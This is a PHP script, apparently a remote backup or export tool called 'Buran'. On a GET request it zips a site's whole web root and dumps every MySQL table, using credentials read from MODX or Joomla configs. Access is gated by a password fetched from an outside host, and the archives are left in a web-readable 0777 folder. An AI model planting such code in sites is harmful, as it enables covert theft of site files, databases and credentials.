<?php
// Buran_005
// scorN - v.2.7
// 16.02.2016
// Буран
//====================================================================================================
	error_reporting(0);
                                                                                                              
                                                                                                              
                                                                                                              
                                                                                                              
                                                                                                              
                                                                                                              
                                                                                      
                                                                        
//====================================================================================================
	$root= $_SERVER[ 'DOCUMENT_ROOT' ];
	$host= str_replace( "www.", "", $_SERVER[ 'HTTP_HOST' ] );
	
	$maxtime= 20;
	
	$act= $_GET[ 'act' ];
	
	$ww= @file_get_contents( "http://fndelta.gavrishkin.ru/__password__002.php?host=". $host ."&w=". $_GET[ 'w' ] );
	if( ! $ww || $_GET[ 'w' ] == '' || $_GET[ 'w' ] != $ww ) exit();
//====================================================================================================

	srand( time() );

if( $act == 'archive_files' )
{
	$maxfilessize= 1024*1024*256;
	
	$f_part= intval( $_GET[ 'part' ] );
	$f_from= intval( $_GET[ 'ffrom' ] );
	$f_count= intval( $_GET[ 'fcount' ] );
	
	$txtlog= "\n".'| '. date( 'd.m.Y, H:i:s' );
	
	print "[[OK]]\n";
	print $host ."\n";
	$txtlog .= ' | host: '. $host;
	
	if( ! $f_part ) $f_part= 1;
	$txtlog .= ' | part: '. $f_part;
	
	$zip= new ZipArchive();
	if( $zip )
	{
		$c_starttime= microtime( 1 );
		print "[[START]]\n";
		$txtlog .= ' | start';
		
		$zip_path= '/_buran/b005/';
		@mkdir( $root . $zip_path, 0777 );
		
		if( $f_part == 1 || ! isset( $_GET[ 'zip_filename' ] ) ) $zip_filename= $host .'_files_'. date( 'Y-m-d-H-i-s' );
			else $zip_filename= trim( $_GET[ 'zip_filename' ] );
		if( ! $zip_filename ){ print "[[ERROR03]]\n"; exit(); }
		$zip_filename_full= $zip_filename .'__part'. $f_part .'.zip';
		$zip->open( $root . $zip_path . $zip_filename_full, ZIPARCHIVE::CREATE );
		
		$ii= 0;
		$size= 0;
		$flag_next_part= false;
		$queue[ 'folders' ][]= '/';
		do{
			$mt_end= microtime( 1 );
			if( $mt_end - $c_starttime > $maxtime && $maxtime != '' )
			{
				$flag_next_part= true;
				print "[[MAXTIME]]\n";
				$txtlog .= ' | maxtime';
				break 1;
			}
			$folder= array_shift( $queue[ 'folders' ] );
			action( $folder, $zip, $queue, $ii, $size, $flag_next_part );
			if( $flag_next_part ) break 1;
		}while( $queue[ 'folders' ][ 0 ] );
		
		$zip->close();
		
		if( ! $flag && $flag_next_part )
		{
			print "[[NEXTPART]]\n";
			$txtlog .= ' | nextpart';
			$context= stream_context_create( array( "http" => array( "timeout" => 1 ) ) );
			$flag= true;
			$result_part= @file_get_contents( 'http://'. $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] .'&zip_filename='. urlencode( $zip_filename ) .'&ffrom='. $ii .'&part='. ($f_part+1), false, $context );
		}
		
		if( file_exists( $root . $zip_path . $zip_filename_full ) )
		{
			print $root ."\n";
			print "http://". $host . $zip_path . $zip_filename_full ."\n";
			print "[[FINISH_". $f_from ."_". $f_count ."_". $ii ."_". $size ."]]\n";
			
			$txtlog .= ' | root: '. $root;
			$txtlog .= ' | archive: '. $zip_filename_full;
			$txtlog .= ' | from: '. $f_from;
			$txtlog .= ' | count: '. $f_count;
			$txtlog .= ' | ii: '. $ii;
			$txtlog .= ' | size: '. $size;
			
		}else{
			print "[[ERROR02]]\n";
			$txtlog .= ' | error02';
		}
	}else{
		print "[[ERROR01]]\n";
		$txtlog .= ' | error01';
	}
	print "[[V_2.7]]\n";
	$txtlog .= ' | v2.7';
	
	$logfile= fopen( $root . $zip_path . 'log.txt', 'a' );
	fwrite( $logfile, $txtlog );
	fclose( $logfile );
}

function action( $dir, &$zip, &$queue, &$ii, &$size, &$flag_next_part )
{
	global $root;
	global $host;
	global $c_starttime;
	global $maxtime;
	global $maxfilessize;
	
	global $f_from;
	global $f_count;
	
	if( $open= opendir( $root . $dir ) )
	{
		while( $file= readdir( $open ) )
		{
			$mt_end= microtime( 1 );
			if( $mt_end - $c_starttime > $maxtime && $maxtime != '' )
			{
				$flag_next_part= true;
				print "[[MAXTIME]]\n";
				break 1;
			}
			
			if( filetype( $root . $dir . $file ) == 'link' ) continue 1;
			
			if( ! is_dir( $root . $dir . $file ) )
			{
				$ii++;
				if( $ii < $f_from ) continue 1;
				if( $f_count && $ii >= $f_from + $f_count ) break 1;
				
				$size += filesize( $root . $dir . $file );
				
				$zip->addFile( $root . $dir . $file, 'www.'. $host . $dir . $file );
				
				if( $size > $maxfilessize )
				{
					$flag_next_part= true;
					break 1;
				}
				
				if( $ii % 2000 == 0 ) sleep( 3 );
				
			}elseif( $file != "." && $file != ".." && $file != ".th" && $file != "_buran" ){
				$queue[ 'folders' ][]= $dir . $file ."/";
			}
		}
	}else{
		print "[[ERROR__OPENDIR]]\n";
	}
}

// =======================================================================================
// =======================================================================================
// =======================================================================================

if( $act == 'archive_db' )
{
	$cms= cms();
	
	if( $cms[ 0 ] == 'modx_evo' )
	{
		@include_once( $root .'/manager/includes/config.inc.php' );
		$resConn= @mysql_connect( $database_server, $database_user, $database_password );
		$mysql_select_db_result= @mysql_select_db( trim( $dbase, "`" ) );
		@mysql_query( "{$database_connection_method} {$database_connection_charset}" );
		
	}elseif( $cms[ 0 ] == 'joomla' ){
		@include_once( $root .'/configuration.php' );
		$conf= new JConfig();
		$resConn= @mysql_connect( $conf->host, $conf->user, $conf->password );
		$mysql_select_db_result= @mysql_select_db( $conf->db );
	}else{
		print "[[ERROR02]]\n";
	}
	if( $mysql_select_db_result )
	{
		print "[[OK]]\n";
		print $host ."\n";
		
		print "[[START]]\n";
		
		$path= '/_buran/b005/';
		@mkdir( $root . $path, 0777 );
		$dumpFile= $host .'_db_'. date( 'Y-m-d-H-i-s' ) .'.sql';
		
		MysqlDump( $root . $path . $dumpFile, $resConn );
		
		print $root ."\n";
		print "http://". $host . $path . $dumpFile ."\n";
		print "[[FINISH]]\n";
	}else{
		print "[[ERROR01]]\n";
	}
	print "[[V_2.6]]\n";
}

function MysqlDump( $dumpFile, $resConn )
{
	$ff= fopen( $dumpFile, 'w' );
	
	$ln= "\n";
	$rr= mysql_query( "SHOW TABLES", $resConn );
	if( $rr && mysql_num_rows( $rr ) > 0 )
	{
		$output .= "# -- start / ". date( 'd.m.Y, H:i:s' );
		$output .= $ln.$ln;
		while( $row= mysql_fetch_row( $rr ) )
		{
			$output .= '# ---------------------------- `'. $row[ 0 ] .'`';
			$output .= $ln.$ln;
			
			$rrr= mysql_query( "SHOW CREATE TABLE `{$row[0]}`", $resConn );
			if( $rrr && mysql_num_rows( $rrr ) > 0 )
			{
				while( $roww= mysql_fetch_row( $rrr ) )
				{
					$output .= "DROP TABLE IF EXISTS `{$row[0]}`;";
					$output .= $ln;
					$output .= $roww[ 1 ] .";";
					$output .= $ln.$ln;
				}
			}
			
			$rrr= mysql_query( "SELECT * FROM `{$row[0]}`", $resConn );
			if( $rrr && mysql_num_rows( $rrr ) > 0 )
			{
				while( $roww= mysql_fetch_assoc( $rrr ) )
				{
					$output .= "INSERT INTO `{$row[0]}` SET ";
					$first= true;
					foreach( $roww AS $key => $val )
					{
						$val= addslashes( $val );
						$output .= ( $first ? "" : "," ) ."`{$key}`='{$val}'";
						$first= false;
					}
					$output .= ";";
					$output .= $ln;
					
					if( strlen( $output ) > 1024*1024 )
					{
						fwrite( $ff, $output );
						$output= '';
					}
				}
			}
			
			$output .= $ln.$ln;
			
			fwrite( $ff, $output );
			$output= '';
		}
		$output .= "# -- the end / ". date( 'd.m.Y, H:i:s' );
		$output .= $ln.$ln;
		fwrite( $ff, $output );
	}
	
	fclose( $ff );
	
	return true;
}

// =======================================================================================

function cms()
{
	//v003
	global $root;
	
	@include( $root .'/manager/includes/version.inc.php' );
	if( ! empty( $modx_full_appname ) )
	{
		$cms= 'modx_evo'; $cmsname= $modx_full_appname;
	}
	@include( $root .'/configuration.php' );
	if( class_exists( 'JConfig' ) ) $conf= new JConfig();
	if( $conf->host )
	{
		$cms= 'joomla'; $cmsname= '';
	}
	
	return array( $cms, $cmsname );
}